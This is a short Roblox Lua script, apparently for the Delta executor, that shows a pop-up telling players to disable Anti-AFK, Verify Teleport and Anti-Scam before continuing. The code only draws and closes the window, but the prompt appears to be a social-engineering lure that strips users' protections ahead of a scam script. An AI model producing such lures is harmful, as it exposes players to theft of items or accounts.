-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "DeltaWarningUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Main Frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 220)
frame.Position = UDim2.new(0.5, -200, 0.5, -110)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

-- UICorner for round edges
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

-- Title Text
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 0, 40)
title.Position = UDim2.new(0, 10, 0, 10)
title.BackgroundTransparency = 1
title.Text = "⚠️ Turn off all on Delta settings ⚠️"
title.TextColor3 = Color3.fromRGB(255, 0, 0)
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.Parent = frame

-- Instruction Text
local instructions = Instance.new("TextLabel")
instructions.Size = UDim2.new(1, -20, 0, 100)
instructions.Position = UDim2.new(0, 10, 0, 50)
instructions.BackgroundTransparency = 1
instructions.TextXAlignment = Enum.TextXAlignment.Left
instructions.TextYAlignment = Enum.TextYAlignment.Top
instructions.Text = [[
1. Disable Anti-AFK
2. Disable Verify Teleport
3. Disable Anti-Scam

✅ After disabling, press OK to continue.
]]
instructions.TextColor3 = Color3.fromRGB(255, 255, 255)
instructions.Font = Enum.Font.Gotham
instructions.TextSize = 16
instructions.Parent = frame

-- Okay Button
local okayBtn = Instance.new("TextButton")
okayBtn.Size = UDim2.new(0, 200, 0, 40)
okayBtn.Position = UDim2.new(0.5, -100, 1, -60)
okayBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
okayBtn.Text = "Okay"
okayBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
okayBtn.Font = Enum.Font.GothamBold
okayBtn.TextSize = 20
okayBtn.Parent = frame

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 8)
btnCorner.Parent = okayBtn

-- Button Click -> Remove UI
okayBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)
